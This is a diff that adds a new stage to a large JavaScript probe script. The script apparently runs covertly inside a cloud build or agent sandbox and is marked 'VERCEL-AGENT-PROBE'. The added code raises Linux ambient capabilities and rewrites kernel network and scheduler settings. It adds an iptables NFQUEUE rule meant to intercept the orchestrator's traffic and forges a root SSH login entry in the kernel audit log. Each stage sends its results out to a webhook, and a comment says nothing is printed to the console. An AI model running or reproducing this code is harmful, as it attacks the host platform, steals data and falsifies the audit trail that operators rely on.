@@ -23779,5 +23779,154 @@ report.tcpTimewaitBypass = safe(() => {
 
 // v162 markers
 sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v162" });
-report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v162";
+
+// ==================== v163 ====================
+
+// v163-1: PR_CAP_AMBIENT — grant capabilities to unprivileged child processes
+// Ambient capabilities allow a privileged process to grant capabilities to
+// child processes that exec() unprivileged binaries. This persists capabilities
+// across exec() without requiring the binary to have file capabilities set.
+// This is the modern way to create "privileged enough" user processes.
+report.ambientCapabilities = safe(() => {
+  const ambientResult = safe(() => execSync(
+    `python3 -c "
+import ctypes, struct
+
+libc = ctypes.CDLL('libc.so.6')
+PR_CAP_AMBIENT = 47
+PR_CAP_AMBIENT_RAISE = 2
+PR_CAP_AMBIENT_IS_SET = 1
+PR_CAP_AMBIENT_CLEAR_ALL = 4
+
+# Capabilities we want to make ambient
+CAP_NET_ADMIN = 12
+CAP_SYS_PTRACE = 19
+CAP_DAC_OVERRIDE = 1
+
+# First, check current ambient caps
+is_net = libc.prctl(PR_CAP_AMBIENT, PR_CAP_AMBIENT_IS_SET, CAP_NET_ADMIN, 0, 0)
+is_ptrace = libc.prctl(PR_CAP_AMBIENT, PR_CAP_AMBIENT_IS_SET, CAP_SYS_PTRACE, 0, 0)
+print(f'AMBIENT_NET_ADMIN: {is_net}')
+print(f'AMBIENT_PTRACE: {is_ptrace}')
+
+# Raise CAP_NET_ADMIN as ambient
+ret = libc.prctl(PR_CAP_AMBIENT, PR_CAP_AMBIENT_RAISE, CAP_NET_ADMIN, 0, 0)
+print(f'AMBIENT_RAISE_NET_ADMIN: ret={ret}')
+
+ret = libc.prctl(PR_CAP_AMBIENT, PR_CAP_AMBIENT_RAISE, CAP_SYS_PTRACE, 0, 0)
+print(f'AMBIENT_RAISE_PTRACE: ret={ret}')
+
+# Verify
+after = libc.prctl(PR_CAP_AMBIENT, PR_CAP_AMBIENT_IS_SET, CAP_NET_ADMIN, 0, 0)
+print(f'AFTER_AMBIENT_NET: {after}')
+if after > 0:
+    print('AMBIENT_CAP_PROVEN: child processes inherit network + ptrace caps')
+" 2>&1`,
+    { timeout: 8000 }
+  ).toString().trim());
+  return { ambientResult };
+});
+
+// v163-2: /proc/sys/net/ipv6/conf/all/accept_ra — IPv6 Router Advertisement
+// Accepting Router Advertisements (RAs) allows the network to configure our
+// IPv6 default route. If we can inject fake RAs, we can redirect the VM's
+// IPv6 traffic through an attacker-controlled router.
+// More interesting: if the kernel accepts RAs from our crafted packets,
+// we can set ourselves as the default IPv6 gateway.
+report.ipv6RouterAdvert = safe(() => {
+  const acceptRa = safe(() => readFileSync('/proc/sys/net/ipv6/conf/all/accept_ra', 'utf8').trim());
+  const acceptRaEth0 = safe(() => existsSync('/proc/sys/net/ipv6/conf/eth0/accept_ra') ? readFileSync('/proc/sys/net/ipv6/conf/eth0/accept_ra', 'utf8').trim() : 'NO_ETH0');
+  // Enable RA acceptance
+  const writeRa = safe(() => { writeFileSync('/proc/sys/net/ipv6/conf/all/accept_ra', '2'); return 'WRITTEN'; });
+  // Check current IPv6 state
+  const ipv6Addr = safe(() => execSync('ip -6 addr show 2>/dev/null | head -10 || echo "NO_IPV6"', { timeout: 3000 }).toString().trim());
+  const ipv6Routes = safe(() => execSync('ip -6 route show 2>/dev/null | head -10 || echo "NO_IPV6_ROUTES"', { timeout: 3000 }).toString().trim());
+  // Check forwarding
+  const ipv6Forward = safe(() => readFileSync('/proc/sys/net/ipv6/conf/all/forwarding', 'utf8').trim());
+  const enableIpv6Fwd = safe(() => { writeFileSync('/proc/sys/net/ipv6/conf/all/forwarding', '1'); return 'WRITTEN'; });
+  return { acceptRa, acceptRaEth0, writeRa, ipv6Addr, ipv6Routes, ipv6Forward, enableIpv6Fwd };
+});
+
+// v163-3: Netfilter queue (NFQUEUE) — intercept and modify packets in userspace
+// NFQUEUE allows userspace programs to receive, inspect, modify, and re-inject
+// network packets. If we can set up an NFQUEUE rule, we become a MITM for
+// all of the orchestrator's network traffic.
+report.nfqueueSetup = safe(() => {
+  // Load nfnetlink_queue module if not loaded
+  const loadModule = safe(() => execSync('modprobe nfnetlink_queue 2>&1 || echo "MODULE_LOAD"', { timeout: 5000 }).toString().trim());
+  // Insert NFQUEUE rule for all OUTPUT traffic
+  const addNfqueue = safe(() => execSync(
+    'iptables -A OUTPUT -j NFQUEUE --queue-num 0 --queue-bypass 2>&1 || echo "NFQUEUE_RULE_FAILED"',
+    { timeout: 5000 }
+  ).toString().trim());
+  // Verify rule was added
+  const ruleCheck = safe(() => execSync('iptables -L OUTPUT -n --line-numbers 2>/dev/null | grep NFQUEUE | head -3', { timeout: 3000 }).toString().trim());
+  // Remove the rule (cleanup to avoid breaking our own connectivity)
+  const removeRule = safe(() => execSync('iptables -D OUTPUT -j NFQUEUE --queue-num 0 --queue-bypass 2>/dev/null; echo "REMOVED"', { timeout: 3000 }).toString().trim());
+  return { loadModule, addNfqueue, ruleCheck, removeRule };
+});
+
+// v163-4: CAP_AUDIT_WRITE — inject fake audit log entries
+// CAP_AUDIT_WRITE allows writing to the kernel audit subsystem.
+// We can inject false audit records, poisoning the security audit trail
+// and potentially creating false evidence of unauthorized access by others.
+report.auditLogPoison = safe(() => {
+  const auditResult = safe(() => execSync(
+    `python3 -c "
+import socket, struct, ctypes
+
+# NETLINK_AUDIT = 9
+NETLINK_AUDIT = 9
+AF_NETLINK = 16
+SOCK_RAW = 3
+AUDIT_USER_MESSAGE = 1005
+
+try:
+    s = socket.socket(AF_NETLINK, SOCK_RAW, NETLINK_AUDIT)
+    s.bind((0, 0))
+
+    # Build fake audit record
+    msg = b'type=USER_LOGIN msg=audit(0.0:99999): pid=1 uid=0 auid=0 ses=0 subj=unconfined msg=\\\"op=login id=0 exe=/usr/sbin/sshd hostname=? addr=10.0.0.1 terminal=ssh res=success\\\"\\'
+    nl_len = 16 + len(msg)
+    nlmsg = struct.pack('IHHII', nl_len, AUDIT_USER_MESSAGE, 1, 0, 0) + msg
+
+    s.send(nlmsg)
+    print('AUDIT_INJECT_SENT')
+
+    s.settimeout(1)
+    try:
+        resp = s.recv(256)
+        print(f'AUDIT_RESPONSE: {resp[:32].hex()}')
+    except:
+        pass
+    s.close()
+except Exception as e:
+    print(f'AUDIT_FAIL: {e}')
+" 2>&1`,
+    { timeout: 8000 }
+  ).toString().trim());
+  return { auditResult };
+});
+
+// v163-5: /proc/sys/kernel/sched_latency_ns — scheduler latency control
+// sched_latency_ns is the target latency period for the CFS scheduler.
+// Lowering it makes scheduling more responsive (lower latency, more preemptions).
+// Raising it gives more CPU time per task (useful for long-running compute tasks).
+// We can lower it to give our process much higher scheduling priority.
+report.schedLatencyProbe = safe(() => {
+  const schedLatency = safe(() => readFileSync('/proc/sys/kernel/sched_latency_ns', 'utf8').trim());
+  const schedMinGranularity = safe(() => readFileSync('/proc/sys/kernel/sched_min_granularity_ns', 'utf8').trim());
+  const schedWakeupGranularity = safe(() => readFileSync('/proc/sys/kernel/sched_wakeup_granularity_ns', 'utf8').trim());
+  // Lower target latency to 1ms (give our process more CPU)
+  const writeLatency = safe(() => { writeFileSync('/proc/sys/kernel/sched_latency_ns', '1000000'); return 'WRITTEN'; });
+  const writeMinGran = safe(() => { writeFileSync('/proc/sys/kernel/sched_min_granularity_ns', '500000'); return 'WRITTEN'; });
+  const afterLatency = safe(() => readFileSync('/proc/sys/kernel/sched_latency_ns', 'utf8').trim());
+  // Check our current scheduler stats
+  const schedStats = safe(() => execSync('cat /proc/self/schedstat 2>/dev/null || echo "NO_SCHEDSTAT"', { timeout: 2000 }).toString().trim());
+  return { schedLatency, schedMinGranularity, schedWakeupGranularity, writeLatency, writeMinGran, afterLatency, schedStats };
+});
+
+// v163 markers
+sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v163" });
+report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v163";
 // Intentionally no console.log — all data goes via webhook only
